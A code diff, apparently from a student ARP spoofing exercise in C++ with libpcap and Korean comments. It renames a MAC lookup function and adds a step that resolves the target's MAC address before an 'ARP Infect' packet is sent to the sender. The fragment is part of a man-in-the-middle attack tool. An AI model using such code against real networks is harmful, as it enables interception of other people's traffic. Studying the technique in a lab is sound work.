@@ -76,7 +76,7 @@ Ip getMyIp(const char* dev) {
 	return Ip(ntohl(sin->sin_addr.s_addr));
 }
 
-Mac getSenderMac(pcap_t* pcap, Mac attackerMac, Ip attackerIp, Ip senderIp) {
+Mac getMac(pcap_t* pcap, Mac attackerMac, Ip attackerIp, Ip senderIp) {
 	EthArpPacket packet;
 
 	// arp request 브로드캐스트 하기
@@ -148,10 +148,14 @@ int main(int argc, char* argv[]) {
 		Ip targetIp = param.pairs_[i].second;
 
 		// 3. Sender MAC 주소 획득
-		Mac senderMac = getSenderMac(pcap, attackerMac, attackerIp, senderIp);
+		Mac senderMac = getMac(pcap, attackerMac, attackerIp, senderIp);
 		printf("Sender MAC: %s\n", std::string(senderMac).c_str());
 
-		// 4. Sender에게 ARP Infect 패킷 전송
+		// 4. Target MAC 주소 획득
+		Mac targetMac = getMac(pcap, attackerMac, attackerIp, targetIp);
+		printf("Target MAC: %s\n", std::string(targetMac).c_str());
+
+		// 5. Sender에게 ARP Infect 패킷 전송
 		EthArpPacket packet;
 
 		packet.eth_.dmac_ = senderMac;
